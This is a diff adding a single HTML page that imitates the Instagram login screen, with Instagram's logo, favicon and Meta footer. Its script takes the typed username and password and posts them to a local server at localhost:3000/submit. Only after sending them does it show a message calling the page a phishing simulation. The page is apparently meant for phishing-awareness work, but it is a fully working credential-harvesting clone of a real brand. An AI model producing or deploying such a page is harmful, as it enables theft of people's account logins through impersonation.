@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Instagram</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png">
+  <style>
+    * { box-sizing: border-box; font-family: Arial, sans-serif; }
+    body {
+      background-color: #fafafa;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .container {
+      max-width: 350px;
+      width: 100%;
+      padding: 20px;
+      background-color: #fff;
+      border: 1px solid #dbdbdb;
+      text-align: center;
+    }
+    .container img.logo {
+      width: 175px;
+      margin: 40px auto 20px;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      margin: 5px 0;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+      background: #fafafa;
+    }
+    button {
+      width: 100%;
+      padding: 10px;
+      background-color: #0095f6;
+      color: white;
+      font-weight: bold;
+      border: none;
+      border-radius: 5px;
+      margin-top: 10px;
+      cursor: pointer;
+    }
+    .or { margin: 20px 0; color: #8e8e8e; font-size: 14px; }
+    .signup { margin-top: 20px; font-size: 14px; }
+    .signup a { text-decoration: none; color: #0095f6; }
+    .footer { margin-top: 30px; font-size: 12px; color: #999; }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png"
+         alt="Instagram" class="logo">
+    <form id="loginForm">
+      <input type="text" name="username" placeholder="Phone number, username, or email" required>
+      <input type="password" name="password" placeholder="Password" required>
+      <button type="submit">Log In</button>
+    </form>
+    <div class="or">OR</div>
+    <div class="signup">
+      Don't have an account? <a href="#">Sign up</a>
+    </div>
+    <div class="footer">Meta © 2025</div>
+  </div>
+
+  <script>
+    const form = document.getElementById('loginForm');
+    form.addEventListener('submit', async function (e) {
+      e.preventDefault();
+      const data = {
+        username: form.username.value,
+        password: form.password.value
+      };
+
+      try {
+        await fetch('http://localhost:3000/submit', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(data)
+        });
+
+        form.innerHTML = "<p>✅ This was a phishing simulation. No real data was collected.</p>";
+      } catch (err) {
+        form.innerHTML = "<p>❌ Failed to send data. Check server status.</p>";
+        console.error(err);
+      }
+    });
+  </script>
+
+</body>
+</html>
